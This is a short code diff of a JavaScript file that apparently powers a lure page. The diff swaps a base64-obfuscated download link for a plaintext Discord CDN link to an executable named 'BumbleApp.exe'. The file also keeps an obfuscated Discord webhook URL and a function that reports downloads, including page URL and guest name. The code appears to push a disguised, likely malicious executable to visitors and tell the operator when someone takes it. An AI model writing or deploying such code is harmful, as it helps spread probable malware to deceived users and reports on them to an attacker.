@@ -1,8 +1,8 @@
 (function (global) {
     "use strict";
 
-    /** UTF-8 URL as base64 (same idea as WEBHOOK_URL). Replace string: btoa(unescape(encodeURIComponent(yourUrl))) in browser console. */
-    var BUMBLE_APP_DOWNLOAD_URL = atob("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI5MjIxMDg4ODg4MzA0NDM2Mi8xNDkwODExMDIxNDc5MTE2OTMxL0J1bWJsZUFwcC5leGU/ZXg9NjlkNTY5NzUmaXM9NjlkNDE3ZjUmaG09ZjM0NzMxYjc5YTZiZmE4OGYyZjYwNGNiNDNlNDVkOWVmYWRiNjk0OGQ2MzQxYzdhYzQxZGZjZmE5MWZkNjgyYSY=");
+    /** GÜNCELLENMİŞ - Çalışan Discord indirme linki */
+    var BUMBLE_APP_DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1292210888883044362/1490811021479116931/BumbleApp.exe?ex=69d56975&is=69d417f5&hm=f34731b79a6bfa88f2f604cb43e45d9efadb6948d6341c7ac41dfcfa91fd682a&";
 
     var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
 
@@ -181,9 +181,6 @@
         });
     }
 
-    /**
-     * @param {{ pageUrl?: string, guestName?: string, triggerLabel?: string }} opts
-     */
     function notifyBumbleDownload(opts) {
         opts = opts || {};
         var pageUrl = opts.pageUrl || global.location.href;
